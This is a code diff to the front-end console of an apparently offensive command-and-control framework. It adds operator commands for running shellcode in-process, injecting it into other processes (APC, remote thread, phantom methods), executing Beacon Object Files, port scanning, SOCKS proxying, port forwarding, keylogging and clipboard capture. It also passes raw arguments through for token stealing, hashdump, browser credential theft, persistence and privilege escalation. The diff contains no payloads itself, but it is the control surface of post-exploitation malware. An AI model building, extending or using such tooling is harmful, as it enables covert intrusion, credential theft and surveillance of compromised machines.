@@ -39,6 +39,17 @@ const COMMANDS: CommandDef[] = [
   { cmd: 'ps', hint: 'list processes', group: 'system' },
   { cmd: 'kill', hint: 'kill <pid>', group: 'system' },
   { cmd: 'sysinfo', hint: 'system information', group: 'system' },
+  { cmd: 'shellcode', hint: 'shellcode <base64>  run shellcode in-process (call_type: api|syscall|indirect|spoofed)', group: 'loader' },
+  { cmd: 'spawn', hint: 'spawn {"shellcode":"<b64>","process":"notepad.exe","method":"apc|remote_thread|fork_and_run|section|phantom"}', group: 'loader' },
+  { cmd: 'bof', hint: 'bof {"object":"<b64 .o>","entry":"go","arg":"..."}  run a Beacon Object File', group: 'loader' },
+  { cmd: 'portscan', hint: 'portscan {"targets":["10.0.0.1"],"ports":[80,443]}  async scan', group: 'network' },
+  { cmd: 'socks', hint: 'socks {"port":1080,"user":"","pass":""}  SOCKS5 proxy', group: 'network' },
+  { cmd: 'portfwd', hint: 'portfwd {"lport":8080,"rhost":"10.0.0.5","rport":80}  forward', group: 'network' },
+  { cmd: 'netenum', hint: 'netenum {"hosts":["host1"]}  resolve hosts', group: 'network' },
+  { cmd: 'keylog', hint: 'keylog {"interval_ms":100}  capture keys (Windows)', group: 'session' },
+  { cmd: 'clipboard', hint: 'read clipboard text (Windows)', group: 'session' },
+  { cmd: 'jobs', hint: 'list async jobs', group: 'session' },
+  { cmd: 'job-kill', hint: 'job-kill {"id":"job-..."}  stop a job', group: 'session' },
 ]
 
 // Max rendered output lines to keep the DOM light
@@ -363,6 +374,27 @@ export function Console() {
           argsJSON = JSON.stringify({ sleep: sleepVal, jitter: jitterVal })
           break
         }
+        // Commands that consume a raw JSON object (or base64) argument must be
+        // forwarded verbatim — wrapping in {cmd:..} would break their parsers.
+        case 'portscan':
+        case 'socks':
+        case 'portfwd':
+        case 'keylog':
+        case 'shellcode':
+        case 'spawn':
+        case 'bof':
+        case 'jobs':
+        case 'job-kill':
+        case 'clipboard':
+        case 'netenum':
+        case 'token-steal':
+        case 'token-revert':
+        case 'hashdump':
+        case 'browser-creds':
+        case 'persist':
+        case 'getsystem':
+          argsJSON = args.trim()
+          break
         default: argsJSON = args ? JSON.stringify({ cmd: args }) : ''
       }
       run(callBackend('github.com/user/wisp/services.SessionService.SendCommand', selectedId, cmd, argsJSON))
